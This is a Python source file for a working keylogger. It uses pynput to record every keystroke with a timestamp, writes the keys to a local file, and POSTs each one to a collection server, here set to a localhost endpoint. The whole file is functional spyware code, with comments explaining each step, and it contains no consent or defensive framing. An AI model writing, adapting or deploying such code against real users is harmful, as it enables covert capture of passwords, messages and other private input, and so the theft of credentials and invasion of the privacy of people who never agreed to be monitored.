# Import necessary libraries
from pynput.keyboard import Listener  # To listen for keyboard events
from datetime import datetime         # To get the current timestamp
import requests                       # To make HTTP requests

# File to store the logged keystrokes
log_file = 'keylog.txt'

# Function to handle key press events
def on_press(key):
    # Get the current timestamp
    time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Try to get the character of the key; if it's a special key, convert it to string
    try:
        key_value = key.char  # For regular character keys
    except AttributeError as e:
        key_value = str(key)  # For special keys like Enter, Space, etc.

    # Save the key event to the log file with a timestamp
    with open(log_file, 'a') as file:
        file.write(f'{time} - [{key_value}]\n')

    # Prepare the data to be sent to the server
    log_data = {
        'user': 'test_user',  # Replace with actual user identifier if needed
        'key': key_value,     # The key pressed
        'timestamp': time,    # The time the key was pressed
    }

    # Send the data to the server
    try:
        response = requests.post('http://127.0.0.1:5000/logs', json=log_data)
        # Print success or server response
        if response.status_code == 201:  # Assuming 201 Created is the success code
            print(f'{log_data}')  # Log the data sent
        else:
            print(f'Server error: {response.status_code} - {response.text}')
    except requests.exceptions.RequestException as e:
        # Print an error message if the server request fails
        print(f'Error: {e}')

# Start the listener to monitor key presses
with Listener(on_press=on_press) as listener:
    listener.join()
